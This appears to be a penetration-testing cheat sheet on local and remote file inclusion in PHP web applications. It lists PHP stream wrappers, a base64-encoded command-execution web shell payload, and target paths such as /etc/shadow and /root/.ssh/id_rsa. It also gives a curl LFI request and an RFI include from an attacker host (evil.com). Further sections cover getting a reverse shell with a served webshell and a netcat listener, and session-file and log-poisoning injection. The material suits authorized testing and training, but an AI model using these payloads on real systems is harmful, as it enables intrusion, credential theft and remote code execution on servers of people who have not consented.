File Inclusion

  • PayloadAllTheThings

  • wordlist: /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt

  • Null Byte: %00 -> doesn't work on newer systems.

  • Bypass path filter: /etc/passwd/., /etc/passwd/..

  • Use it with Directory Traversal

Try wrappers:

  • file://
  • http://
  • ftp://
  • php://
  • ssh2://
  • php://filter/convert.base64-encode/resource=/etc/passwd
    • convert.base64-encode can be other types of string filters, like string.rot13.
  • data:text/plain,<?php phpinfo(); ?>.
  • data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=whoami
    • <?php system($_GET['cmd']); echo 'Shell done!'; ?> this is the base64 decoded payload.

Good paths to look for:

/etc/issue
/etc/profile
/proc/version
/etc/passwd
/etc/shadow
/root/.bash_history
/var/log/dmessage
/var/mail/root
/root/.ssh/id_rsa
/var/log/apache2/access.log

Local (LFI)​

curl http://<domain> -X POST -H "content-type: application/x-www-form-urlencoded" -d "file=/etc/passwd%00"

# needs POST data: <?php system('id'); ?>
index.php?page=php://input

Remote (RFI)​

Remote File Inclusion: Like LFI but instead pointing to a file, it points to a remote file.

Test​

(1) Prepare payload (this one is inoffensive): <?PHP echo "test"; ?>

(2) Include: http://example.com/index.php?lang=http://evil.com/cmd.txt

(3) Fetch: http://example.com/cmd.txt

Exploit​

  • Get a webshell from /usr/share/webshells/
    • Point to your IP and a custom LPORT.
  • Open a python webserver: python3 -m http.server 80
  • Open a nc listener: rlwrap nc -lvnp 9988
  • Use RFI to get your shell: /api/files.php?name=http://<local_ip>/shell

PHP Session Files​

If session data is stored in files on the server, you can inject malicious code into the session files.

  • Inject a non malicious payload in the input: <?php echo phpinfo(); ?>
  • Call the session: /var/lib/php/sessions/sess_[PHPSESSID].

If you can see the phpinfo page, you can inject something more fun, like id, whoami, pwd, even a reverse shell.

Log Poisoning​

If you have access to some type of log, you can try to inject a malicious log.

Example:

  • You can access /var/log/apache2/access.log.

Then, you craft a request to inject a payload a trigger a bad request error:

  • this can be done by simply opening a netcat on port 80 and sending the payload without headers.
  • <?php echo phpinfo(); ?>

When you view the log, the payload should be at the end of the log file.
